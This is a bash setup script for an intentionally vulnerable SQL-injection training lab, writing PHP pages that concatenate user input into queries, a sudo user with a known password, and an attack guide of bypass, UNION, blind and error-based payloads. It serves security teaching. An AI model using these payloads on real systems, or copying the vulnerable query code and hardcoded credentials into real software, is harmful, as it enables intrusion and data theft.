#!/bin/bash

# SQL Injection Vulnerable Lab Setup Script
# For Educational Purposes Only
# Run this on Ubuntu Server 20.04/22.04

set -e

echo "================================================"
echo "SQL INJECTION VULNERABLE LAB SETUP"
echo "EDUCATIONAL PURPOSE ONLY - DO NOT USE IN PRODUCTION"
echo "================================================"
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
   echo -e "${RED}Please run as root (use sudo)${NC}"
   exit 1
fi

echo -e "${YELLOW}[1/8] Updating system packages...${NC}"
apt-get update -y
apt-get upgrade -y

echo -e "${YELLOW}[2/8] Installing required packages...${NC}"
apt-get install -y apache2 mysql-server php php-mysql php-cli libapache2-mod-php git net-tools

echo -e "${YELLOW}[3/8] Starting and enabling services...${NC}"
systemctl start apache2
systemctl enable apache2
systemctl start mysql
systemctl enable mysql

echo -e "${YELLOW}[4/8] Setting up MySQL database and users...${NC}"

# Create database setup SQL file
cat > /tmp/setup_database.sql << 'EOF'
-- Create the vulnerable database
CREATE DATABASE IF NOT EXISTS vulnerable_db;
USE vulnerable_db;

-- Create users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100),
    is_admin BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert sample data
INSERT INTO users (username, password, email, is_admin) VALUES
('admin', 'admin123', 'admin@securecorp.com', TRUE),
('john', 'password123', 'john@securecorp.com', FALSE),
('jane', 'jane2023', 'jane@securecorp.com', FALSE),
('bob', 'bobsecure', 'bob@securecorp.com', FALSE),
('alice', 'alice456', 'alice@securecorp.com', FALSE),
('root', 'toor', 'root@securecorp.com', TRUE);

-- Create secrets table (for students to discover)
CREATE TABLE IF NOT EXISTS secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    secret_key VARCHAR(100),
    secret_value TEXT,
    description VARCHAR(255)
);

INSERT INTO secrets (secret_key, secret_value, description) VALUES
('system_root_password', 'rootpass123!', 'MySQL root password'),
('ssh_credentials', 'sysadmin:Sysadmin123!@#', 'SSH login credentials'),
('api_key', 'sk-1234567890abcdef', 'Internal API key'),
('backup_location', '/var/backups/secure_backup.tar.gz', 'System backup location'),
('flag', 'FLAG{SQL_1nj3ct10n_Succ3ss!}', 'Capture The Flag - Congratulations!');

-- Create logs table (to practice UNION attacks)
CREATE TABLE IF NOT EXISTS access_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    action VARCHAR(100),
    ip_address VARCHAR(45),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO access_logs (user_id, action, ip_address) VALUES
(1, 'Login successful', '192.168.1.100'),
(2, 'Failed login attempt', '192.168.1.101'),
(1, 'Accessed admin panel', '192.168.1.100'),
(3, 'Password change', '192.168.1.102');

-- Create web application user with limited privileges
CREATE USER IF NOT EXISTS 'web_user'@'localhost' IDENTIFIED BY 'web_pass123';
GRANT SELECT, INSERT, UPDATE, DELETE ON vulnerable_db.* TO 'web_user'@'localhost';
FLUSH PRIVILEGES;

-- Set root password (for educational access)
ALTER USER 'root'@'localhost' IDENTIFIED BY 'rootpass123!';
FLUSH PRIVILEGES;
EOF

# Execute the SQL setup
mysql < /tmp/setup_database.sql

echo -e "${YELLOW}[5/8] Creating web application files...${NC}"

# Create web directory
mkdir -p /var/www/vulnerable-site
cd /var/www/vulnerable-site

# Create index.php (login page)
cat > index.php << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>SecureCorp Login Portal - Educational SQL Injection Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 400px;
        }
        .warning {
            background: #ff6b6b;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background: #5a67d8;
        }
        .error {
            background: #fee;
            color: #c00;
            border: 1px solid #fcc;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 14px;
        }
        .info {
            background: #e3f2fd;
            color: #1565c0;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ EDUCATIONAL LAB - INTENTIONALLY VULNERABLE ⚠️</div>
        <h1>SecureCorp Login</h1>
        
        <?php if (isset($_GET['error'])): ?>
            <div class="error"><?php echo htmlspecialchars($_GET['error']); ?></div>
        <?php endif; ?>
        
        <form method="POST" action="login.php">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter your username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            
            <input type="submit" value="Login">
        </form>
        
        <div class="hint">
            💡 <strong>Student Hint:</strong> This application is vulnerable to SQL injection. 
            Try different inputs to understand how the backend processes your data.
            <br><br>
            <strong>Test inputs to try:</strong>
            <ul style="margin: 5px 0; padding-left: 20px;">
                <li>admin' --</li>
                <li>admin' OR '1'='1</li>
                <li>' OR 1=1 --</li>
                <li>admin' /*</li>
            </ul>
        </div>
        
        <div class="info">
            📚 <strong>Learning Objectives:</strong>
            <ul style="margin: 5px 0; padding-left: 20px;">
                <li>Understand SQL injection vulnerabilities</li>
                <li>Practice exploitation techniques</li>
                <li>Learn about database enumeration</li>
                <li>Discover hidden tables and data</li>
            </ul>
        </div>
    </div>
</body>
</html>
EOF

# Create login.php (vulnerable authentication)
cat > login.php << 'EOF'
<?php
// EDUCATIONAL PURPOSE ONLY - INTENTIONALLY VULNERABLE CODE
// DO NOT USE IN PRODUCTION

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database connection
$host = 'localhost';
$dbname = 'vulnerable_db';
$db_user = 'web_user';
$db_pass = 'web_pass123';

try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $db_user, $db_pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("<div style='background: #fee; padding: 20px; margin: 20px; border: 1px solid #fcc;'>
         <h2>Database Connection Failed</h2>
         <p>Error: " . $e->getMessage() . "</p>
         </div>");
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // VULNERABLE CODE - Direct SQL concatenation (DO NOT USE IN PRODUCTION)
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    
    // Debug mode - shows the actual query being executed
    echo "<!-- DEBUG: SQL Query = $query -->\n";
    
    try {
        $result = $conn->query($query);
        
        if ($result && $result->rowCount() > 0) {
            $user = $result->fetch(PDO::FETCH_ASSOC);
            
            // Start session and store user data
            session_start();
            $_SESSION['username'] = $user['username'];
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['is_admin'] = $user['is_admin'];
            
            // Log the successful login
            $log_query = "INSERT INTO access_logs (user_id, action, ip_address) VALUES (" . $user['id'] . ", 'Login successful', '" . $_SERVER['REMOTE_ADDR'] . "')";
            $conn->query($log_query);
            
            header("Location: dashboard.php");
            exit();
        } else {
            header("Location: index.php?error=Invalid credentials");
            exit();
        }
    } catch(PDOException $e) {
        // Educational error display
        echo "<!DOCTYPE html>
        <html>
        <head>
            <title>SQL Error - Educational Mode</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
                .error-container { 
                    background: white; 
                    padding: 30px; 
                    border-radius: 10px; 
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    max-width: 800px;
                    margin: 0 auto;
                }
                .error-header { 
                    background: #ff6b6b; 
                    color: white; 
                    padding: 15px; 
                    border-radius: 5px;
                    margin-bottom: 20px;
                }
                .query-box {
                    background: #f8f9fa;
                    border-left: 4px solid #ff6b6b;
                    padding: 15px;
                    margin: 20px 0;
                    font-family: 'Courier New', monospace;
                }
                .error-details {
                    background: #fff3cd;
                    border: 1px solid #ffc107;
                    padding: 15px;
                    border-radius: 5px;
                    margin: 20px 0;
                }
                .back-link {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #667eea;
                    color: white;
                    text-decoration: none;
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class='error-container'>
                <div class='error-header'>
                    <h2>⚠️ SQL Execution Error (Educational Mode)</h2>
                </div>
                
                <div class='error-details'>
                    <h3>Error Message:</h3>
                    <p>" . htmlspecialchars($e->getMessage()) . "</p>
                </div>
                
                <div class='query-box'>
                    <h3>Executed Query:</h3>
                    <code>" . htmlspecialchars($query) . "</code>
                </div>
                
                <div class='error-details'>
                    <h3>💡 Learning Tip:</h3>
                    <p>This error message reveals information about the database structure. 
                    In a production environment, such detailed errors should never be shown to users.</p>
                    <p>Notice how your input directly affects the SQL query structure!</p>
                </div>
                
                <a href='index.php' class='back-link'>← Back to Login</a>
            </div>
        </body>
        </html>";
    }
} else {
    header("Location: index.php");
}
?>
EOF

# Create dashboard.php
cat > dashboard.php << 'EOF'
<?php
session_start();

if (!isset($_SESSION['username'])) {
    header("Location: index.php");
    exit();
}

$host = 'localhost';
$dbname = 'vulnerable_db';
$db_user = 'web_user';
$db_pass = 'web_pass123';

try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $db_user, $db_pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - SecureCorp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #667eea;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        h1 { color: #333; margin: 0; }
        .user-info {
            background: #f0f0f0;
            padding: 10px 20px;
            border-radius: 5px;
        }
        .admin-panel {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .success-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .secret-data {
            background: #e8f5e9;
            border: 2px solid #4caf50;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .code {
            background: #f4f4f4;
            padding: 15px;
            border-left: 4px solid #667eea;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background: #667eea;
            color: white;
        }
        .logout-btn {
            background: #dc3545;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
        }
        .flag {
            background: #ffeb3b;
            border: 2px solid #ffc107;
            padding: 20px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            border-radius: 5px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SecureCorp Dashboard</h1>
            <div class="user-info">
                Logged in as: <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong>
                <?php if ($_SESSION['is_admin'] == 1): ?>
                    <span style="color: red; font-weight: bold;"> [ADMIN]</span>
                <?php endif; ?>
            </div>
        </div>

        <div class="success-box">
            <h2>🎉 Congratulations!</h2>
            <p>You successfully bypassed authentication using SQL injection!</p>
            <p><strong>Your session details:</strong></p>
            <ul>
                <li>Username: <?php echo htmlspecialchars($_SESSION['username']); ?></li>
                <li>User ID: <?php echo $_SESSION['user_id']; ?></li>
                <li>Admin Status: <?php echo $_SESSION['is_admin'] ? 'Yes' : 'No'; ?></li>
            </ul>
        </div>

        <?php if ($_SESSION['is_admin'] == 1): ?>
        <div class="admin-panel">
            <h2>🔐 Admin Panel - System Credentials</h2>
            <p>As an admin, you have access to sensitive system information:</p>
            
            <div class="secret-data">
                <h3>Database Credentials (for system access):</h3>
                <div class="code">
Host: localhost
Database: vulnerable_db
Root User: root
Root Password: rootpass123!
Command to connect: mysql -u root -prootpass123! vulnerable_db
                </div>
                
                <h3>System User Account:</h3>
                <div class="code">
Username: labuser
Password: Lab123!@#
Sudo privileges: YES
                </div>
                
                <h3>Web Application Details:</h3>
                <div class="code">
Web Root: /var/www/vulnerable-site
Config File: /etc/apache2/sites-available/vulnerable-site.conf
PHP Version: <?php echo phpversion(); ?>
                </div>
            </div>
            
            <div class="flag">
                🚩 FLAG{SQL_1nj3ct10n_Succ3ss!} 🚩
            </div>
        </div>
        <?php endif; ?>

        <div class="data-section">
            <h2>User Directory</h2>
            <p>Search for users (another vulnerable input!):</p>
            <?php
            $search = isset($_GET['search']) ? $_GET['search'] : '';
            if ($search) {
                // Another vulnerable query for UNION attack practice
                $query = "SELECT id, username, email, is_admin FROM users WHERE username LIKE '%$search%'";
                echo "<!-- DEBUG: Search Query = $query -->\n";
            } else {
                $query = "SELECT id, username, email, is_admin FROM users";
            }
            
            try {
                $result = $conn->query($query);
            ?>
            
            <form method="GET" action="">
                <input type="text" name="search" placeholder="Try: ' UNION SELECT 1,2,3,4 -- " 
                       value="<?php echo htmlspecialchars($search); ?>" style="width: 400px; padding: 8px;">
                <input type="submit" value="Search" style="padding: 8px 15px;">
            </form>
            
            <table>
                <tr>
                    <th>ID</th>
                    <th>Username</th>
                    <th>Email</th>
                    <th>Role</th>
                </tr>
                <?php while ($row = $result->fetch(PDO::FETCH_ASSOC)): ?>
                <tr>
                    <td><?php echo $row['id']; ?></td>
                    <td><?php echo htmlspecialchars($row['username']); ?></td>
                    <td><?php echo htmlspecialchars($row['email']); ?></td>
                    <td><?php echo $row['is_admin'] ? 'Admin' : 'User'; ?></td>
                </tr>
                <?php endwhile; ?>
            </table>
            <?php
            } catch(PDOException $e) {
                echo "<div style='background: #fee; padding: 15px; margin: 15px 0; border: 1px solid #fcc;'>";
                echo "<strong>Search Error:</strong> " . htmlspecialchars($e->getMessage());
                echo "</div>";
            }
            ?>
        </div>

        <div style="margin-top: 30px;">
            <a href="logout.php" class="logout-btn">Logout</a>
        </div>
    </div>
</body>
</html>
EOF

# Create logout.php
cat > logout.php << 'EOF'
<?php
session_start();
session_destroy();
header("Location: index.php");
exit();
?>
EOF

# Create data dump page (for UNION attack discovery)
cat > data.php << 'EOF'
<?php
// This page is intentionally accessible without authentication
// Students can discover it through directory enumeration or UNION attacks

$host = 'localhost';
$dbname = 'vulnerable_db';
$db_user = 'web_user';
$db_pass = 'web_pass123';

try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $db_user, $db_pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Connection failed");
}

$table = isset($_GET['table']) ? $_GET['table'] : 'users';

// Extremely vulnerable query for educational purposes
$query = "SELECT * FROM $table";

try {
    $result = $conn->query($query);
    $data = $result->fetchAll(PDO::FETCH_ASSOC);
    
    // Output as JSON for easy reading
    header('Content-Type: application/json');
    echo json_encode($data, JSON_PRETTY_PRINT);
} catch(PDOException $e) {
    echo json_encode(['error' => $e->getMessage()]);
}
?>
EOF

echo -e "${YELLOW}[6/8] Setting up Apache configuration...${NC}"

# Create Apache virtual host configuration
cat > /etc/apache2/sites-available/vulnerable-site.conf << 'EOF'
<VirtualHost *:80>
    ServerAdmin admin@vulnerable-site.local
    DocumentRoot /var/www/vulnerable-site
    ServerName vulnerable-site.local
    
    <Directory /var/www/vulnerable-site>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/vulnerable-site-error.log
    CustomLog ${APACHE_LOG_DIR}/vulnerable-site-access.log combined
    
    # Enable PHP
    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>
</VirtualHost>
EOF

# Enable the site and disable default
a2dissite 000-default.conf
a2ensite vulnerable-site.conf
a2enmod rewrite

# Set proper permissions
chown -R www-data:www-data /var/www/vulnerable-site
chmod -R 755 /var/www/vulnerable-site

# Restart Apache
systemctl restart apache2

echo -e "${YELLOW}[7/8] Creating system user for lab access...${NC}"

# Create a system user that students can access after getting credentials
useradd -m -s /bin/bash labuser
echo "labuser:Lab123!@#" | chpasswd
usermod -aG sudo labuser

echo -e "${YELLOW}[8/8] Creating attack guide and documentation...${NC}"

# Create attack guide
cat > /var/www/vulnerable-site/ATTACK_GUIDE.md << 'EOF'
# SQL Injection Attack Guide - Educational Purpose Only

## Lab Overview
This is an intentionally vulnerable web application designed for learning SQL injection techniques.

## Attack Vectors

### 1. Basic Authentication Bypass
**Objective:** Login without valid credentials

**Attack payloads:**
```
Username: admin' --
Password: [anything]

Username: admin' OR '1'='1
Password: [anything]

Username: ' OR 1=1 --
Password: [anything]
```

**How it works:**
The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
The `--` comments out the password check.

### 2. Extracting Database Information

**Using UNION attacks in the search field:**
```
' UNION SELECT 1,database(),3,4 --
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='vulnerable_db' --
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secrets' --
```

### 3. Extracting Sensitive Data

**Get data from secrets table:**
```
' UNION SELECT 1,secret_key,secret_value,4 FROM secrets --
' UNION SELECT 1,CONCAT(secret_key,':',secret_value),3,4 FROM secrets --
```

### 4. Advanced Techniques

**Blind SQL Injection:**
```
admin' AND 1=1 --  (True condition)
admin' AND 1=2 --  (False condition)
```

**Time-based Blind SQL Injection:**
```
admin' AND SLEEP(5) --
```

**Error-based SQL Injection:**
```
admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
```

## Post-Exploitation

### Once you have admin access:
1. Note the MySQL root credentials displayed
2. Connect to MySQL: `mysql -u root -prootpass123! vulnerable_db`
3. Explore the database structure
4. Find the flag in the secrets table

### System Access:
1. Use the discovered SSH/system credentials
2. SSH into the system: `ssh labuser@[server-ip]`
3. Explore the file system
4. Check web application source code in `/var/www/vulnerable-site`

## Prevention Techniques (What NOT to do)

1. **Never concatenate user input directly into SQL queries**
2. **Use prepared statements/parameterized queries**
3. **Implement input validation and sanitization**
4. **Use least privilege principle for database users**
5. **Never display detailed error messages in production**
6. **Implement proper authentication and session management**

## Learning Resources
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
EOF

# Create a README for instructors
cat > /root/INSTRUCTOR_README.md << 'EOF'
# SQL Injection Lab - Instructor Guide

## Lab Setup Complete!

### Access Information:
- **Web Application:** http://[server-ip]/
- **MySQL Root:** root / rootpass123!
- **System User:** labuser / Lab123!@#
- **Web User (DB):** web_user / web_pass123

### Student Learning Path:
1. Basic authentication bypass
2. Database enumeration
3. Data extraction
4. System access

### Monitoring Student Progress:
```bash
# Watch Apache access logs
tail -f /var/log/apache2/vulnerable-site-access.log

# Watch MySQL queries
mysql -u root -prootpass123! -e "SELECT * FROM vulnerable_db.access_logs ORDER BY timestamp DESC LIMIT 10;"

# Check successful logins
grep "Login successful" /var/log/apache2/vulnerable-site-access.log
```

### Reset Lab:
```bash
mysql -u root -prootpass123! vulnerable_db < /tmp/setup_database.sql
systemctl restart apache2
```

### Additional Challenges:
1. Have students write secure versions of the vulnerable code
2. Implement WAF rules to block SQL injection
3. Create detection scripts for SQL injection attempts
4. Practice with sqlmap tool

### Safety Reminder:
This lab is intentionally vulnerable. Ensure it's:
- Isolated from production networks
- Behind a firewall
- Only accessible to authorized students
- Regularly monitored for abuse

EOF

echo ""
echo -e "${GREEN}================================================${NC}"
echo -e "${GREEN}SQL INJECTION LAB SETUP COMPLETE!${NC}"
echo -e "${GREEN}================================================${NC}"
echo ""
echo -e "${YELLOW}Access the vulnerable application at:${NC}"
echo -e "${GREEN}http://$(hostname -I | awk '{print $1}')/index.php${NC}"
echo ""
echo -e "${YELLOW}Default Credentials to Try:${NC}"
echo "Username: admin"
echo "Password: admin123"
echo ""
echo -e "${YELLOW}SQL Injection Test:${NC}"
echo "Username: admin' --"
echo "Password: [anything]"
echo ""
echo -e "${YELLOW}Attack guide available at:${NC}"
echo "/var/www/vulnerable-site/ATTACK_GUIDE.md"
echo ""
echo -e "${YELLOW}Instructor guide available at:${NC}"
echo "/root/INSTRUCTOR_README.md"
echo ""
echo -e "${RED}⚠️  IMPORTANT SECURITY NOTICE ⚠️${NC}"
echo -e "${RED}This system is intentionally vulnerable!${NC}"
echo -e "${RED}Only use in isolated lab environments!${NC}"
echo -e "${RED}Never expose to the internet!${NC}"
echo ""